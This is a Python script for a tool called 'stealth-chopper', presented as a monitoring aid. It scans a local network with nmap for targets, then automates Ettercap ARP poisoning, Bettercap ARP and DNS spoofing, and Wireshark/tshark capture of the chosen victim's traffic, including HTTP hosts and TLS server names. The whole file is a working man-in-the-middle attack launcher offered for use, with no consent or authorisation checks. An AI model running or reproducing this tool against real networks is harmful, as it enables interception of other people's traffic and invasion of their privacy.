#!/usr/bin/env python3
"""
Aggressive Sniffer + MITM Launcher
Author: cyb2rS2c
Description:
    This script helps network monitoring professionals quickly spin up
    Ettercap, Bettercap, and Wireshark for man-in-the-middle (MITM)
    and packet sniffing against a single target on a given interface.

    - Ettercap is used for ARP-based MITM and packet logging.
    - Bettercap is used for more advanced MITM features (ARP + DNS spoofing).
    - Wireshark is launched with a live filter targeting the victim IP
      and optionally domain names loaded from url_file.txt.

    If url_file.txt does not exist or is empty, the script will run
    common_url.py to generate it automatically.
"""


import asyncio
import time
import os
import re
import subprocess
import ipaddress
import sys
from colorama import Fore, init
from pathlib import Path
from stealth_chopper.animation import create_ascii_text,clean
from stealth_chopper.validation import is_valid_ipv4,is_valid_iface,check_dependencies,ensure_url_file
from stealth_chopper.recon_scan import perform_nmap_scan, choose_target_by_index, get_subnet
init(autoreset=True)

def get_network_info(interface):
    """Return (default_gateway, local_ip) for interface."""
    try:
        proc = subprocess.Popen(["ip", "route"], stdout=subprocess.PIPE)
        stdout, _ = proc.communicate()
        route_output = stdout.decode()
        gateway_match = re.search(r"default via (\S+)", route_output)
        default_gateway = gateway_match.group(1) if gateway_match else None
        proc = subprocess.Popen(["ip", "addr", "show", interface], stdout=subprocess.PIPE)
        stdout, _ = proc.communicate()
        ip_output = stdout.decode()
        ip_match = re.search(r"inet (\S+)", ip_output)
        ip_address = ip_match.group(1).split("/")[0] if ip_match else None

        return default_gateway, ip_address
    except Exception as e:
        print(f"[!] Network info error: {e}")
        return None, None


def create_excluded_ips_for_target(target_ip):
    """Generate list of subnet IPs to exclude, except target itself."""
    try:
        subnet = ipaddress.ip_network(f"{target_ip}/24", strict=False)
    except Exception:
        return []
    return [str(ip) for ip in subnet.hosts() if str(ip) != target_ip]

def create_excluded_ips_file(filter_file, exclude_ips):
    """Write Ettercap filter file for excluded IPs."""
    try:
        with open(filter_file, "w") as f:
            for ip in exclude_ips:
                f.write(f"if (ip.src == '{ip}' || ip.dst == '{ip}') {{\n")
                f.write("    drop();\n")
                f.write("}\n")
        print(Fore.GREEN + f"[+] Created filter file: {filter_file}")
    except Exception as e:
        print(Fore.RED + f"[!] Error creating filter file: {e}")


async def compile_filter_file(filter_file):
    if not os.path.isfile(filter_file):
        print(Fore.RED + f"[!] Error: '{filter_file}' does not exist.")
        return None
    compiled_file = filter_file.replace(".ef", ".efc")
    compile_cmd = ["etterfilter", filter_file, "-o", compiled_file]
    proc = await asyncio.create_subprocess_exec(*compile_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    await proc.communicate()
    return compiled_file

async def run_ettercap(interface, default_gateway, target_ip, filter_file):
    compiled_file = await compile_filter_file(filter_file)
    if not compiled_file:
        print(Fore.RED + "[!] Failed to compile filter file.")
        return

    pcap_file = f"{target_ip}_filtered_activity.pcap"
    ettercap_cmd = [
        "ettercap", "-T", "-S", "-i", interface, "-F", compiled_file,
        "-M", "arp:remote", f"//{default_gateway}/", f"//{target_ip}/",
        "-w", pcap_file
    ]

    print(Fore.YELLOW + f"[*] Starting Ettercap on {interface} → {target_ip}")
    proc = await asyncio.create_subprocess_exec(*ettercap_cmd)
    await proc.communicate()


async def run_bettercap(interface, target_ip):
    domaintoforward = "unused.com"
    commands = [
        "net.probe on",
        "net.show",
        f"set arp.spoof.targets {target_ip}",
        "net.sniff on",
        "clear",
        f"set dns.spoof.domains {domaintoforward}",
        "dns.spoof on"
    ]
    bettercap_cmds = "; ".join(commands)
    

    bettercap_cmd = ["bettercap", "-iface", interface, "-eval", bettercap_cmds]
    print(Fore.YELLOW + f"[*] Starting Bettercap on {interface} → {target_ip}")
    proc = await asyncio.create_subprocess_exec(*bettercap_cmd)
    time.sleep(1)
    await proc.communicate()

def load_url_filters(url_file):
    try:
        with open(url_file, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def build_wireshark_filter(target_ip, exclude_ips, url_file=None):
    target_ip_filter = f"(ip.src == {target_ip} || ip.dst == {target_ip})"
    exclude_filter = " && ".join([f"!(ip.src == {ip} || ip.dst == {ip})" for ip in exclude_ips])

    filters = [target_ip_filter]
    if exclude_filter:
        filters.append(f"({exclude_filter})")

    if url_file and os.path.isfile(url_file):
        urls = load_url_filters(url_file)
        if urls:
            domain_filters = []
            for url in urls:
                domain = re.sub(r"^https?://", "", url)
                domain = domain.split("/")[0]
                domain_filters.append(f'http.host contains "{domain}"')
                domain_filters.append(f'tls.handshake.extensions_server_name contains "{domain}"')
            filters.append("(" + " || ".join(domain_filters) + ")")

    return " && ".join(filters)


async def launch_wireshark(interface, target_ip, exclude_ips, url_file="myvenv/lib/python3.13/site-packages/stealth_chopper/assets/url_file.txt", output_file=None):
    """
    Launch Wireshark or tshark with filters and ensure packets are saved.
    """
    if output_file is None:
        output_file = f"{target_ip}_capture.pcap"

    filter_str = build_wireshark_filter(target_ip, exclude_ips, url_file)
    print(Fore.BLUE + f"[*] Launching Wireshark on {interface}")
    print(Fore.BLUE + f"[*] Capture will be saved to: {output_file}")
    subprocess.Popen([
        "tshark",
        "-i", interface,
        "-w", output_file,
        "-Y", filter_str
    ])
    subprocess.Popen(["wireshark", "-i", interface, "-k", "-Y", filter_str])


def print_usage():
    print(Fore.RED + f"{'<|>'*30}\n")
    print(Fore.CYAN + "Usage:")
    print(Fore.YELLOW + "\tstealth-chopper <target_ip> <interface>")
    print(Fore.YELLOW + "\tstealth-chopper --scan")
    print(Fore.YELLOW + "\tstealth-chopper\n")
    print(Fore.CYAN + "Examples:")
    print(Fore.YELLOW + "\tstealth-chopper 192.168.1.147 wlan0")
    print(Fore.YELLOW + "\tstealth-chopper --scan")
    print(Fore.YELLOW + "\tstealth-chopper")
    print(Fore.CYAN + "\t(Automatically scans the network and lets you choose a target)\n")
    print(Fore.RED + f"{'<|>'*30}\n")

def interactive_menu():
    print(Fore.CYAN + "\nHow would you like to run the script?\n")
    print(Fore.YELLOW + "1) Enter target IP and interface manually")
    print(Fore.YELLOW + "2) Automatically scan the network for targets\n")
    while True:
        c = input(Fore.CYAN + "Select an option (1 or 2): ").strip()
        if c == "1":
            ip = input(Fore.CYAN + "Enter target IP: ").strip()
            iface = input(Fore.CYAN + "Enter network interface: ").strip()
            return "manual", ip, iface
        if c == "2":
            return "scan", None, None
        print(Fore.RED + "[!] Invalid choice.")

async def main(target_ip, interface, default_gateway, exclude_ips):
    filter_file = "excluded_ips.ef"
    create_excluded_ips_file(filter_file, exclude_ips)
    print(Fore.MAGENTA + "[*] Starting monitoring toolkit...")
    await asyncio.gather(
        run_ettercap(interface, default_gateway, target_ip, filter_file),
        run_bettercap(interface, target_ip),
        launch_wireshark(interface, target_ip, exclude_ips, "myvenv/lib/python3.13/site-packages/stealth_chopper/assets/url_file.txt")
    )

def cli():
    try:
        create_ascii_text()
        if len(sys.argv) == 1 or "--interactive" in sys.argv:
            mode, ip, iface = interactive_menu()

            if mode == "manual":
                target_ip = ip
                interface = iface

                if not is_valid_ipv4(target_ip):
                    print(Fore.RED + "[!] Invalid target IP.")
                    sys.exit(1)
                if not is_valid_iface(interface):
                    print(Fore.RED + "[!] Invalid network interface.")
                    sys.exit(1)

            elif mode == "scan":
                print(Fore.CYAN + "\n[INFO] Running automatic network scan…\n")

                subnet, iface = get_subnet()
                print(f"Detected subnet: {subnet}")
                print(f"Using interface: {iface}")

                targets = perform_nmap_scan(subnet)
                if not targets:
                    print(Fore.RED + "[!] No targets found during scan.")
                    sys.exit(1)

                target_ip, target_name = choose_target_by_index(targets)
                print(Fore.GREEN + f"\n[+] Selected target: {target_ip} ({target_name})")

                interface = iface

        elif "--scan" in sys.argv:
            print(Fore.CYAN + "\n[INFO] Running automatic network scan…\n")

            subnet, iface = get_subnet()
            print(f"Detected subnet: {subnet}")
            print(f"Using interface: {iface}")

            targets = perform_nmap_scan(subnet)
            if not targets:
                print(Fore.RED + "[!] No targets found during scan.")
                sys.exit(1)

            target_ip, target_name = choose_target_by_index(targets)
            print(Fore.GREEN + f"\n[+] Selected target: {target_ip} ({target_name})")

            interface = iface
        else:
            if len(sys.argv) != 3:
                print_usage()
                sys.exit(1)

            target_ip = sys.argv[1]
            interface = sys.argv[2]

            if not is_valid_ipv4(target_ip):
                print(Fore.RED + "[!] Invalid target IP.")
                sys.exit(1)
            if not is_valid_iface(interface):
                print(Fore.RED + "[!] Invalid network interface.")
                sys.exit(1)
        check_dependencies()
        url_file = ensure_url_file()

        default_gateway, ip_address = get_network_info(interface)
        if not default_gateway or not ip_address:
            print(Fore.RED + "[!] Could not detect default gateway or local IP.")
            sys.exit(1)

        exclude_ips = create_excluded_ips_for_target(target_ip)

        asyncio.run(main(target_ip, interface, default_gateway, exclude_ips))

    except KeyboardInterrupt:
        print("\n[!] User interrupted. Exiting cleanly.")
        clean()

    except RuntimeError as e:
        print(f"[!] Error: {e}")
